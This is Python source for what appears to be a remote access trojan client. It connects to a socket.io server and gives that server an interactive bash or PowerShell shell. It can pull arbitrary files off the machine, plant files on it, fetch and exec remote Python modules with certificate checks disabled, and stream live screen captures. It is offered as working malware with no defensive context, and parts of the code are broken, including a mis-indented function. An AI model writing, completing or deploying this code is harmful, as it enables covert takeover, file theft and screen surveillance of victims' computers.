import subprocess
import threading
import platform
import socketio
import sys
import base64
import ssl
from urllib.request import urlopen
from PIL import Image
import importlib.util
import mss
import time
import io
import os
import re
import queue
import cv2
import numpy as np

# Declare the global stop event
stop_event = threading.Event()

def run(data):
    def create_module(url):
        # Create an SSL context that doesn't verify certificates
        context = ssl._create_unverified_context()
        with urlopen(url, context=context) as response:
            code = response.read().decode('utf-8')
    
        spec = importlib.util.spec_from_loader('temp', loader=None)
        module = importlib.util.module_from_spec(spec)
    
        # Execute the code in the module's namespace
        exec(code, module.__dict__)
    
        return module

    sio = socketio.Client(logger=False, engineio_logger=False)

    system = platform.system()

    global shell

    if system == "Linux" or system == "Darwin":
        shellScript = "bash"
    elif system == 'Windows':
        shellScript = "powershell"
    else:
        shellScript = "bash"

    class InteractiveShell:
        def __init__(self):
            self.process = None
            self.master_fd = None  # Master file descriptor for PTY on Unix systems
            self.running = False

        def start(self):
            self.running = True
            if os.name == 'posix':  # Unix-like systems
                print("Linux shell")
                import pty
                self.master_fd, slave_fd = pty.openpty()
                import termios
                attrs = termios.tcgetattr(slave_fd)
                attrs[3] = attrs[3] & ~termios.ECHO  # Disable ECHO flag
                termios.tcsetattr(slave_fd, termios.TCSANOW, attrs)
                self.process = subprocess.Popen(
                    [shellScript],
                    stdin=slave_fd,
                    stdout=slave_fd,
                    stderr=slave_fd,
                    universal_newlines=True,
                    close_fds=True
                )
                output_thread = threading.Thread(target=self.read_output_posix)
            else:  # Windows
                print("Windows shell")
                self.process = subprocess.Popen(
                    [shellScript],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    universal_newlines=True,
                    shell=True
                )
                output_thread = threading.Thread(target=self.read_output_windows)
                error_thread = threading.Thread(target=self.read_err_windows).start()

            output_thread.start()

        def read_output_posix(self):
            while self.running:
                try:
                    output = os.read(self.master_fd, 1024).decode("utf-8", errors="ignore").replace("\r\n", "\n").replace("\r", "\n").strip()
                    if output:
                        sio.emit("result", str(output))
                except OSError:
                    break

        def read_output_windows(self):
            while self.running:
                output = self.process.stdout.readline().rstrip()
                if output:
                    sio.emit("result", output)

        def read_err_windows(self):
            while self.running:
                output = self.process.stderr.readline().rstrip()
                if output:
                    sio.emit("result", output)

        def write_input(self, command):
            if os.name == 'posix':
                        if not command.endswith("\n"):
                            command += "\n"
                            os.write(self.master_fd, command.encode())
            else:
                self.process.stdin.write(command + "\n")
                self.process.stdin.flush()

    @sio.on("command")
    def command(data_new):
        if data['uuid'] == data_new['id']:
            shell.write_input(data_new['cmd'])

    @sio.on('restart')
    def restart(data_new):
        global shell  # Declare shell as global to modify it
        if data_new == data['uuid']:
            if shell.process:
                shell.process.terminate()
                shell.running = False
            shell = InteractiveShell()  # Create a new InteractiveShell instance
            shell.start()  # Start the new shell process

    @sio.event
    def connect():
        sio.emit("mConnect", data)
        print(sio.sid)
        print(data["uuid"])

    @sio.on('upload_file')
    def upload_file(data_new):
        if data['uuid'] == data_new['uuid']:
            print(data_new['file_name'])
            with open(data_new['file_name'], 'wb') as f:
                decoded_data = base64.b64decode(data_new['file'])
                f.write(decoded_data)

    @sio.on("download_file")
    def download_file(data_new):
        if data['uuid'] == data_new['uuid']:
            with open(data_new['file_path'], 'rb') as f:
                file = f.read()
            file_ready = base64.b64encode(file).decode('utf-8')
            sio.emit('download_file_return', {'uuid': data_new['uuid'], 'file_name': data_new['file_path'], 'file': file_ready})
            print("emited")

    @sio.on("pem")
    def pem(data_new):
        if data['uuid'] == data_new['uuid']:
            print(data['url'] + data_new['url'])
            module = create_module(data['url'] + data_new['url'])
            module.run(sio, data['uuid'])

    def compress_image_opencv(img, quality):
    """Compress image using OpenCV for faster performance."""
    img_np = np.array(img)  # Convert PIL Image to NumPy array
    success, jpeg_data = cv2.imencode('.jpg', img_np, [cv2.IMWRITE_JPEG_QUALITY, quality])
    return jpeg_data.tobytes() if success else None

    def take_screenshots(sio, uid, fps=15, quality=5):
        frame_interval = 1 / fps
        last_capture_time = 0
    
        # Use a queue to offload emissions to a separate thread
        frame_queue = queue.Queue()
    
        def emit_frames():
            while not stop_event.is_set() or not frame_queue.empty():
                try:
                    frame_data = frame_queue.get(timeout=0.1)  # Wait for frames in the queue
                    sio.emit("screenshot", {"uid": uid, "image": frame_data})
                    print("Frame emitted")
                except queue.Empty:
                    continue  # No frames in the queue; keep waiting
    
        # Start a thread for emitting frames
        emitter_thread = threading.Thread(target=emit_frames)
        emitter_thread.start()
    
        with mss.mss() as sct:
            monitor = sct.monitors[0]  # Capture the entire screen
    
            while not stop_event.is_set():
                current_time = time.time()
                if current_time - last_capture_time >= frame_interval:
                    # Capture screenshot
                    screenshot = sct.grab(monitor)
                    img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
    
                    # Compress the image with OpenCV
                    compressed_data = compress_image_opencv(img, quality)
    
                    # Add the compressed frame to the queue
                    if compressed_data:
                        frame_queue.put(compressed_data)
                        print("Frame added to queue")
    
                    last_capture_time = current_time
    
                # Sleep to maintain FPS
                time.sleep(max(0, frame_interval - (time.time() - current_time)))
    
        # Wait for the emitter thread to finish
        frame_queue.put(None)  # Signal the emitter thread to stop
        emitter_thread.join()
    
    # Example usage with socket.io
    screenshot_thread = None
    
    @sio.on("screen_status")
    def screen_status(data_new):
        global screenshot_thread
    
        if data['uuid'] == data_new['uid']:
            if data_new['status'] == "start":
                stop_event.clear()  # Reset the event to False
                screenshot_thread = threading.Thread(target=take_screenshots, args=(sio, data['uuid']))
                screenshot_thread.start()
            else:
                stop_event.set()  # Signal the thread to stop
                if screenshot_thread:
                    screenshot_thread.join()  # Wait for the thread to finish
                    screenshot_thread = None


    sio.connect(data['url'])

    shell = InteractiveShell()
    shell.start()
    sio.wait()
